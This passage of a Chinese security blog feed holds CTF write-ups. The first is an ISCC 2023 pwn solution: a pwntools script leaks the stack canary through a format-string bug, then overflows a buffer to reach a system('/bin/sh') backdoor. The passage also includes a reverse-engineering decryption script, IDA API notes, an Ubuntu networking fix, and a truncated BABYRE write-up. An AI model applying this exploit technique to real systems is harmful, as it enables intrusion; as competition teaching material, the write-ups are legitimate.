alt="2023ISCC-三个愿望8.png"></p><p>同时，存在后门函数 <code>haveadoor()</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023ISCC-%E4%B8%89%E4%B8%AA%E6%84%BF%E6%9C%9B9.png" alt="2023ISCC-三个愿望9.png"></p><p>查看 <code>system(&quot;/bin/sh&quot;)</code> 的地址为 <code>0x4011F5</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023ISCC-%E4%B8%89%E4%B8%AA%E6%84%BF%E6%9C%9B10.png" alt="2023ISCC-三个愿望10.png"></p><p>所以思路就是利用 <code>thirdwish()</code> 函数中的 <code>s</code> 溢出覆盖返回地址为 <code>0x4011F5</code>，即可触发 <code>system(&quot;/bin/sh&quot;)</code></p><p><mark>关键就在于如何绕过金丝雀 <code>canary</code> 来覆盖返回地址</mark></p><p>由于 <code>secondwish()</code> 函数中存在格式化字符串漏洞，并且栈中也存在 <code>canary</code> 保护，因此可以利用格式化字符串漏洞将栈上的 <code>canary</code> 的值打印出来，即可获取 <code>canary</code> 的值，在 <code>thirdwish()</code> 函数中利用栈溢出覆盖时保持 <code>canary</code> 的值不动即可</p><blockquote><p><strong>关于 canary</strong><br><em>canary 的值在程序每一次运行都是会改变的<br>但是，在一个程序的一次运行过程中，canary 的值都是相同的</em><br>因此 <code>secondwish()</code> 函数的栈中泄露出的 <code>canary</code> 的值，其实和 <code>thirdwish()</code> 函数中的 <code>canary</code> 的值是一样的</p></blockquote><p>由于 <code>secondwish()</code> 函数中 <code>s</code> 距离金丝雀 <code>var_8</code> 的长度为：0x30 - 0x8 &#x3D; 0x28<br>64 位程序一个参数占用 8 字节，0x28 &#x2F; 8 &#x3D; 5，即：<code>var_8</code> 是栈上的第 5 个参数<br>64 位程序的前 6 个参数存放在寄存器 <code>RDI</code>、<code>RSI</code>、<code>RDX</code>、<code>RCX</code>、<code>R8</code>、<code>R9</code> 内，当超过 6 个参数才存入栈中<br>因此 <code>var_8</code> 的值应在第 6 + 5 &#x3D; 11 个参数的位置，使用 <code>printf(&quot;%11$p&quot;)</code> 将其泄露，这个值就是金丝雀 <code>canary</code></p><hr><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>  <span class="token comment"># 导入ctypes库使Python可以执行C语言的函数</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>content <span class="token operator">=</span> <span class="token number">1</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/三个愿望/makewishes"</span><span class="token punctuation">)</span>haveadoor_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"haveadoor"</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 绕过随机数校验</span>    <span class="token keyword">global</span> io    lib <span class="token operator">=</span> cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/三个愿望/libc.so.6"</span><span class="token punctuation">)</span>  <span class="token comment"># C运行库</span>    lib<span class="token punctuation">.</span>srand<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 将种子设为1</span>    number <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>lib<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">9</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 执行随机函数</span>    <span class="token keyword">return</span> number<span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/三个愿望/makewishes"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"59.110.164.72"</span><span class="token punctuation">,</span> <span class="token number">10001</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x16</span> <span class="token operator">-</span> <span class="token number">0x08</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Now you can make your first wish\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>  <span class="token comment"># 设置伪随机数种子为1</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please give me a number!\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>srand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 绕过伪随机数校验</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Now you can make your second wish!\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"%11$p"</span><span class="token punctuation">)</span>  <span class="token comment"># 格式化字符串漏洞泄露canary（栈上第11个值）</span>canary <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>  <span class="token comment"># 接收canary的值</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please give me a number!\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>srand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 绕过伪随机数校验</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Now you can make your final wish!\n"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x30</span> <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x4011F5</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023ISCC-%E4%B8%89%E4%B8%AA%E6%84%BF%E6%9C%9B11.png" alt="2023ISCC-三个愿望11.png"></p>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【ISCC 2023】JustDoIt</title>
      <link href="/posts/af6a683e.html"/>
      <url>/posts/af6a683e.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li>对于加密算法的逆向，根据密文恢复明文</li></ul><hr><p><a href="https://iscc.isclab.org.cn/">（2023年5月1日-2023年5月25日）【ISCC 2023】JustDoIt</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>用 32 位 IDA 打开，<code>shift + F12</code> 查看与 flag 有关信息，跟进过去</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ISCC2023-JustDoIt1.png" alt="ISCC2023-JustDoIt1.png"></p><p>结合运行程序的输出可知：<br><code>sub_4865AD()</code> 为 <code>printf()</code> 函数<br><code>sub_484D2F()</code> 为 <code>scanf()</code> 函数<br>其中，<code>v5</code> 为明文，<code>v8</code> 为密文</p><p>分析可知加密逻辑在 <code>sub_487C91()</code> 中，<code>sub_487C91()</code> 执行 <code>sub_499080()</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ISCC2023-JustDoIt2.png" alt="ISCC2023-JustDoIt2.png"></p><p>逻辑比较清晰了，都是一些常规运算，逆过来写一个解密函数即可</p><p>加密逻辑：<br>① 先将 <code>flag</code> 的每个元素减 60<br>② 然后将字符串的顺序往后顺延一位<br>③ 通过 <code>for</code> 循环把每一位字符加上其数组索引<br>④ 再通过一个 <code>for</code> 循环进行除、取余、异或等操作处理字符串</p><p>按照逻辑，编写脚本解密即可</p><hr><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span>  </span>  <span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>      <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token keyword">int</span> v8<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">23</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">68</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">68</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">15</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">94</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">95</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">24</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">87</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">26</span><span class="token punctuation">;</span>        v8<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'i'</span><span class="token punctuation">;</span>    <span class="token comment">// 注意最后一位</span>      <span class="token keyword">char</span> key<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token char">'I'</span><span class="token punctuation">,</span> <span class="token char">'S'</span><span class="token punctuation">,</span> <span class="token char">'C'</span><span class="token punctuation">,</span> <span class="token char">'C'</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>          <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> m <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> m <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> <span class="token operator">++</span>m <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>          v8<span class="token punctuation">[</span>m<span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token operator">*</span>key<span class="token punctuation">;</span>          v8<span class="token punctuation">[</span>m<span class="token punctuation">]</span> <span class="token operator">-=</span> key<span class="token punctuation">[</span>m <span class="token operator">%</span> <span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">%</span> <span class="token number">5</span><span class="token punctuation">;</span>          v8<span class="token punctuation">[</span>m<span class="token punctuation">]</span> <span class="token operator">=</span> v8<span class="token punctuation">[</span>m<span class="token punctuation">]</span> <span class="token operator">+</span> key<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">%</span> <span class="token number">6</span> <span class="token operator">+</span> key<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token number">6</span><span class="token punctuation">;</span>          v8<span class="token punctuation">[</span>m<span class="token punctuation">]</span> <span class="token operator">-=</span> key<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token number">7</span> <span class="token operator">+</span> <span class="token operator">*</span>key <span class="token operator">%</span> <span class="token number">7</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> <span class="token operator">++</span>k <span class="token punctuation">)</span>          v8<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">-=</span> k<span class="token punctuation">;</span>        <span class="token keyword">int</span> tmp <span class="token operator">=</span> v8<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">14</span><span class="token punctuation">;</span> j <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>j <span class="token punctuation">)</span>          v8<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v8<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> tmp<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>          v8<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">60</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> l <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> l <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> <span class="token operator">++</span>l<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span> v8<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>ISCC{Just~Do~It}</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ISCC2023-JustDoIt3.png" alt="ISCC2023-JustDoIt3.png"></p>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu虚拟机网络图标消失</title>
      <link href="/posts/a2fb6ec7.html"/>
      <url>/posts/a2fb6ec7.html</url>
      
        <content type="html"><![CDATA[<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><blockquote><p>Ubuntu 虚拟机网络图标消失，整个网络模块都不见了，虚拟机也无法联网，怎么重启都没有用</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Ubuntu%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9B%BE%E6%A0%87%E6%B6%88%E5%A4%B11.png" alt="Ubuntu虚拟机网络图标消失1.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Ubuntu%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9B%BE%E6%A0%87%E6%B6%88%E5%A4%B12.png" alt="Ubuntu虚拟机网络图标消失2.png"></p><hr><h1 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h1><blockquote><p>原因暂时未知，莫名其妙的 bug，用着用着就单机了 QAQ</p></blockquote><hr><h1 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h1><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><blockquote><p>比较推荐这个，如果不行再尝试方法二</p></blockquote><p>在终端下，重启网络管理器：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> nmcli network off<span class="token function">sudo</span> nmcli network on<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><blockquote><p>这个方法我之前成功过，不过有时候也没作用，主要是需要关机，很麻烦</p></blockquote><p>打开 VM 的虚拟网络编辑器，按下图箭头顺序，还原默认设置，然后再打开虚拟机即可</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Ubuntu%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9B%BE%E6%A0%87%E6%B6%88%E5%A4%B13.png" alt="Ubuntu虚拟机网络图标消失3.png"></p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDA新版与旧版的API变更</title>
      <link href="/posts/bbb01dd.html"/>
      <url>/posts/bbb01dd.html</url>
      
        <content type="html"><![CDATA[<h1 id="IDA-的变更"><a href="#IDA-的变更" class="headerlink" title="IDA 的变更"></a>IDA 的变更</h1><blockquote><p>在做逆向的时候，有时会涉及到对硬指令的更改，不论是直接修改还是异或之类的，由于数据量比较大，所以会用到 IDA 提供的脚本编辑器（<code>shift + F2</code>）</p><p>但是网上有些 WP 给出的是比较旧的 IDA 脚本，在新版 IDA 中使用会报出各种 <code>&quot;NameError: name xxx is not defined&quot;</code> 的错误，这是因为 IDA 官方在新版中修改了部分 API 的名称，导致新旧版本不互通</p></blockquote><hr><h2 id="脚本示例"><a href="#脚本示例" class="headerlink" title="脚本示例"></a>脚本示例</h2><ul><li>在旧版本中：</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python">address <span class="token operator">=</span> <span class="token number">0x600b00</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">182</span><span class="token punctuation">)</span><span class="token punctuation">:</span> PatchByte<span class="token punctuation">(</span>address <span class="token operator">+</span> i<span class="token punctuation">,</span> Byte<span class="token punctuation">(</span>address <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0xC</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>在新版本中</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python">address <span class="token operator">=</span> <span class="token number">0x600B00</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">182</span><span class="token punctuation">)</span><span class="token punctuation">:</span>ida_bytes<span class="token punctuation">.</span>patch_byte<span class="token punctuation">(</span>address <span class="token operator">+</span> i<span class="token punctuation">,</span> idc<span class="token punctuation">.</span>get_wide_byte<span class="token punctuation">(</span>address <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0xC</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>在 IDA 7.0 以后的版本中，要将：<br><code>idc.PatchByte()</code> 改为 <code>ida_bytes.patch_byte()</code><br><code>idc.Byte()</code> 改为 <code>idc.get_wide_byte()</code></p></blockquote><hr><h1 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h1><blockquote><p>网上解决方法提到了很多，但是我尝试之后，发现大部分方法在我使用的 <a href="https://www.52pojie.cn/">吾爱破解论坛</a> 版的 <a href="https://www.52pojie.cn/thread-1584115-1-1.html">IDA Pro 7.7.220118 (SP1) 全插件绿色版</a> 上无效，最后我是在 IDA 官方文档上解决</p><p>为避免大家再次踩坑，所以记录一下</p></blockquote><hr><h2 id="官方文档"><a href="#官方文档" class="headerlink" title="官方文档"></a>官方文档</h2><blockquote><p>Hex-Rays 在官网的 <code>The guide</code> 部分列出了新版与旧版 IDA 中 API 的名称变化，需要时可以 <code>ctrl + F</code> 自行查找 API 名称是否变动（一般旧版在函数名前加上 idc，例如 <code>idc.xxx()</code>）</p></blockquote><ul><li>官网地址：<br>  <a href="https://www.hex-rays.com/products/ida/support/ida74_idapython_no_bc695_porting_guide.shtml">Porting from IDAPython 6.x-7.3, to 7.4</a></li></ul><hr><h2 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h2><blockquote><p>其他方法在我的 IDA 版本中无效，但是也搜集了一下，说不定其他版本可以</p></blockquote><ul><li>链接：（见方法 1、方法 2）<br>  <a href="https://www.52pojie.cn/thread-1403005-1-1.html">关于IDA7.5 IDApython api差异问题及解决办法 - 『脱壳破解区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【攻防世界】BABYRE</title>
      <link href="/posts/97260469.html"/>
      <url>/posts/97260469.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p>了解 <mark>SMC 自解码的原理</mark>，使用 IDA 脚本破解 SMC 自解码</p></li><li><p><mark>新版 IDA 与 旧版 IDA 由于 API 改变，脚本写法有所不同</mark></p></li><li><p><mark>通过 IDA 远程调试绕过 SMC 自解码</mark></p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/media/file/task/8813b6340dfc4b009c45a8cf81999a3e.babyRE">【攻防世界】BABYRE</a></p><hr><h1 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h1><p>IDA 打开，定位到主函数：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE1.png" alt="攻防世界_BABYRE1.png"></p><p>逻辑感觉很简单</p><p>首先对 <code>judge[]</code> 数组做异或操作，跟进 <code>judge[]</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE2.png" alt="攻防世界_BABYRE2.png"></p><p>要求用户输入 <code>s</code>，<code>v5</code> 是 <code>s</code> 的长度，只要满足 <code>if(v5 == 14 &amp;&amp; (*judge)(s))</code> 就能得到 flag</p><p>但是乍一看，这个条件好像有哪里怪怪的<br><code>v5 == 14</code> 这个好理解，但是 <code>(*judge)(s)</code> 就很奇怪</p><p>前面的 <code>jugde[]</code> 是个数组，怎么这里变成一个函数了？</p><p>本来一度摸不着头脑，注意到刚开始的异或操作：<code>for ( i = 0; i &lt;= 181; ++i )</code><br>这里循环了 182 次，我们再回到 <code>judge[]</code> 定义的地方<br><code>judge</code> 的起始地址是 <code>0x600B00</code>，182 就是 <code>0xB6</code><br>那结尾的地址就是 <code>0x600B00 + 0xB6 - 1 = 0x600BB5</code></p><p>从上往下跟过去看一下 <code>judge</code> 后面的内容</p><p>但是内容都是这样的十六进制数据：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE3.png" alt="攻防世界_BABYRE3.png"></p><p>联想到程序中的数据、指令、代码其实都是二进制数据形式存放的<br><strong>于是猜测这个 <code>judge</code> 可能本来就不是一个数组，而是函数<br>这些内容其实就是函数里的数据，只是经过了加密处理，程序开头的异或操作可能就是一种对 <code>judge</code> 的解密，把 <code>judge</code> 恢复成了正常的函数</strong> <em>（其实就是 <code>SMC</code> 自解码）</em></p><p><mark>首先按照这个主函数给出的逻辑对 <code>judge</code> 进行解密</mark><br>因为异或的数据比较多，输入<code>快捷键 shift + F2</code> 打开 IDA 的脚本编辑器，输入如下脚本：（适用于 IDA 7.0 以后的版本）</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">address <span class="token operator">=</span> <span class="token number">0x600B00</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">182</span><span class="token punctuation">)</span><span class="token punctuation">:</span>ida_bytes<span class="token punctuation">.</span>patch_byte<span class="token punctuation">(</span>address <span class="token operator">+</span> i<span class="token punctuation">,</span> idc<span class="token punctuation">.</span>get_wide_byte<span class="token punctuation">(</span>address <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0xC</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Done"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>注意：<br>在 IDA 7.0 以前的版本中，这个脚本应该这么写（网上很多 WP 就是这么写的）：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">add <span class="token operator">=</span> <span class="token number">0x600b00</span>  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">182</span><span class="token punctuation">)</span><span class="token punctuation">:</span> PatchByte<span class="token punctuation">(</span>add <span class="token operator">+</span> i<span class="token punctuation">,</span> Byte<span class="token punctuation">(</span>add <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0xC</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>但是 IDA 7.0 以后，官方对 API 进行了更改<br>如果还是按老版本来写，会报出：<br><code>NameError: name &#39;PatchByte&#39; is not defined</code><br><code>NameError: name &#39;Byte&#39; is not defined</code><br>等错误，因为 <code>PatchByte</code>、<code>Byte</code> 已经不能直接用于新版的 IDA 了</p><p><em>详见《IDA新版与旧版的API变更》</em></p></blockquote><p>可以看到脚本执行前后 <code>judge</code> 